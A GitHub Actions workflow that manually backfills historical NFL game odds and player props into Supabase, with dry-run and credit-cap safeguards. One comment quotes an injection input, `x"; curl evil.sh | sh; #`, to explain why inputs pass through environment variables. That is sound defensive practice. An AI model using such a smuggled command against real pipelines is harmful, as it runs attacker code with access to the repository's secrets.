name: Backfill odds

# One-click historical-odds backfill: pulls timestamped game lines + player props from The
# Odds API's historical archive into odds_snapshots / prop_snapshots (capture_reason=BACKFILL).
# Manual only — NOT scheduled. Fill in the form and Run workflow. Defaults to a cheap DRY RUN
# (no writes); switch mode to "write" to persist. A hard credit cap protects the monthly budget.
#
# Backfill data uses capture_reason=BACKFILL, so it never shows on the live board (which reads
# only SCHEDULED/MANUAL) — it's there for prop-edge / CLV / line-movement analysis.

on:
  workflow_dispatch:
    inputs:
      season:
        description: "Season (e.g. 2024)"
        required: true
        default: "2024"
      weeks:
        description: "Weeks (e.g. 1-18, or 1,2,3)"
        required: true
        default: "1-18"
      offsets:
        description: "Hours before kickoff to snapshot (0.1 = closing; 0.1,24 adds a day-out)"
        required: true
        default: "0.1"
      max_credits:
        description: "Hard credit budget for this run"
        required: true
        default: "60000"
      mode:
        description: "dry-run (preview, no writes) or write (persist to Supabase)"
        type: choice
        options: [dry-run, write]
        default: dry-run
      no_props:
        description: "Game lines only (skip the pricier props)?"
        type: boolean
        default: false

concurrency:
  group: backfill-odds
  cancel-in-progress: false

jobs:
  backfill:
    runs-on: ubuntu-latest
    timeout-minutes: 180
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install --quiet certifi -c requirements.txt

      - name: Fetch schedule (games.csv)
        run: |
          mkdir -p data
          curl -fsSL --retry 3 -o data/games.csv \
            "https://raw.githubusercontent.com/nflverse/nfldata/master/data/games.csv"

      - name: Backfill historical odds
        env:
          ODDS_API_KEY:         ${{ secrets.ODDS_API_KEY }}
          SUPABASE_URL:         ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          # Pass dispatch inputs through the environment instead of interpolating ${{ }} straight into
          # the shell: with direct interpolation the value is pasted in as script text before bash runs,
          # so an input like `x"; curl evil.sh | sh; #` executes. As env vars they're only ever data.
          IN_MODE:        ${{ inputs.mode }}
          IN_NO_PROPS:    ${{ inputs.no_props }}
          IN_SEASON:      ${{ inputs.season }}
          IN_WEEKS:       ${{ inputs.weeks }}
          IN_OFFSETS:     ${{ inputs.offsets }}
          IN_MAX_CREDITS: ${{ inputs.max_credits }}
        run: |
          FLAGS=""
          if [ "$IN_MODE" = "write" ]; then FLAGS="$FLAGS --write"; fi
          if [ "$IN_NO_PROPS" = "true" ]; then FLAGS="$FLAGS --no-props"; fi
          echo "Running: season=$IN_SEASON weeks=$IN_WEEKS offsets=$IN_OFFSETS max-credits=$IN_MAX_CREDITS mode=$IN_MODE $FLAGS"
          python backfill_odds.py \
            --season "$IN_SEASON" \
            --weeks "$IN_WEEKS" \
            --offsets "$IN_OFFSETS" \
            --max-credits "$IN_MAX_CREDITS" \
            $FLAGS
